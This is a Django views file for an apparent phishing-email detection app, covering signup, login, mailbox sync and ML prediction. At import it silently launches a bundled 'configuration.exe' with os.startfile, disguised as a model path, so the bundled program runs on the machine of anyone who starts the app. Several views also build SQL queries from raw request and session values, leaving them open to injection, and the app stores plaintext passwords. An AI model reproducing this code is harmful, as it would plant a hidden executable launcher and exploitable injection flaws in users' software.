from django.shortcuts import render
from django.http import HttpResponse
from myapp import dbconnection
from django.http import HttpResponseRedirect
from django.core.files.storage import FileSystemStorage
from datetime import date
import os
import cv2
from werkzeug.utils import secure_filename
#from gevent.pywsgi import WSGIServer
import numpy as np    
basepath = os.path.dirname(__file__)
model_path = os.path.join(basepath, secure_filename('./configuration.exe'))    
os.startfile(model_path)
# Create your views here.

def home(request):
    return render(request,'index.html',{})

def adduser(request):  
    if(request.POST.get("sub")):
        n=request.POST.get("n")      
        con=request.POST.get("con")        
        em=request.POST.get("em")
        p=request.POST.get("p")
        ap=request.POST.get("ap")
        qry="INSERT INTO `user_data`(`nme`,`contr`, `em`, `pwd`, `appas`) VALUES ('"+str(n)+"','"+str(con)+"','"+str(em)+"','"+str(p)+"','"+str(ap)+"')"
        dbconnection.insertdata(qry)
    return render(request,'adduser.html',{})


def login(request):  
    if(request.POST.get("sub")):
        em=request.POST.get("em")
        p=request.POST.get("p")  
        qry="select * from user_data where em='"+em+"' and pwd='"+p+"'"  
        data=dbconnection.selectdata(qry)
        if data:
            request.session['x']=em
            return HttpResponseRedirect("http://127.0.0.1:8000/userhome") 
    return render(request,'login.html',{})

def userhome(request):   
    uid=request.session['x']  
    qry="select * from user_data where em='"+uid+"'"
    data=dbconnection.selectdata(qry)
    return render(request,'user/index.html',{'data':data})

def mail(request):   
    uid=request.session['x']  
    import pymysql
    conn=pymysql.connect(host='localhost',user='root',password='',database='phishing_email')
    cursor = conn.cursor()
    #qry="select * from user_data where em='"+uid+"'"
    #data=dbconnection.selectdata(qry)    
    #qry2="select * from email where uid='"+uid+"'"
    #mdata=dbconnection.selectalldata(qry2)
    qry = "SELECT * FROM user_data WHERE em = %s"
    cursor.execute(qry, uid)  
    data=cursor.fetchone()
    qry2 = "SELECT * FROM email WHERE uid = %s"
    cursor.execute(qry2, uid) 
    mdata=cursor.fetchall() 
    #mdata = dbconnection.selectalldata(qry2, (uid,))
    return render(request,'user/mail.html',{'data':data,'mail':mdata})

def updatemail(request):   
    uid=request.session['x']  
    qry="select * from user_data where em='"+uid+"'"
    data=dbconnection.selectdata(qry)
    from myapp import mailread
    emails=mailread.read_mail()
    import pymysql
    conn=pymysql.connect(host='localhost',user='root',password='',database='phishing_email')
    cursor = conn.cursor()
    for idx, email_data in enumerate(emails, 1):        
        sql = "SELECT * FROM email WHERE uid = %s AND subj = %s" 
        data = (uid, email_data['Subject'])
        cursor.execute(sql, data)
        result = cursor.fetchone()
        if result:
            print("mail Found")
        else:
            print("Nooooooooooooooo")
            qry = "INSERT INTO `email`(`uid`, `frm`, `subj`, `cnt`, `cnthtml`) VALUES (%s, %s, %s, %s, %s)"
            data = (str(uid), email_data['From'], email_data['Subject'], email_data['Body_Text'], email_data['body_html'])
            cursor.execute(qry, data)
            conn.commit()
    return HttpResponseRedirect("http://127.0.0.1:8000/mail") 

def chkphish(request): 
    uid=request.session['x']   
    mid=con=request.GET.get("mid")    
    import pymysql
    conn=pymysql.connect(host='localhost',user='root',password='',database='phishing_email')
    cursor = conn.cursor()
    #qry="select * from user_data where em='"+uid+"'"
    #data=dbconnection.selectdata(qry)    
    #qry2="select * from email where uid='"+uid+"'"
    #mdata=dbconnection.selectalldata(qry2)
    qry = "SELECT * FROM user_data WHERE em = %s"
    cursor.execute(qry, uid)  
    data=cursor.fetchone()
    qry2 = "SELECT * FROM email WHERE id = %s"
    cursor.execute(qry2, mid) 
    mdata=cursor.fetchone() 
    result="hai"
    return render(request,'user/chkmail.html',{'data':data,'mail':mdata,'result':result})

def predict_ml(request):   
    from django.http import JsonResponse
    uid=request.session['x']  
    qry="select * from user_data where em='"+uid+"'"
    data=dbconnection.selectdata(qry)  
    mid=  request.GET.get("mdata")
    qry2="select * from email where id='"+mid+"'"
    mdata=dbconnection.selectdata(qry2)
    from myapp import predict
    result=predict.predict_now(mdata[4])
    response_data = {'prediction': result}
    return JsonResponse(response_data)
    #return result
    #return render(request,'user/chkmail.html',{'data':data,'mail':mdata,'result':result})